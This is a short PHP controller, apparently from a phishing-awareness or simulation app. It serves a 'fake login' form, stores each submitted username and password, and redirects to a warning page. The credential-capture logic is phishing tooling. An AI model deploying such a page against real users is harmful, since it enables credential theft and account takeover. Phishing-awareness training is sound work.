<?php
// LoginController.php - Controlador para manejar el inicio de sesión falso

namespace App\Controllers;
use App\Models\Credential;

class LoginController {
    public function showLoginForm() {
        include '../app/Views/login.view.php';
    }

    public function captureCredentials($username, $password) {
        $credential = new Credential();
        $credential->store($username, $password);
        header("Location: ../public/warning.php");
    }
}
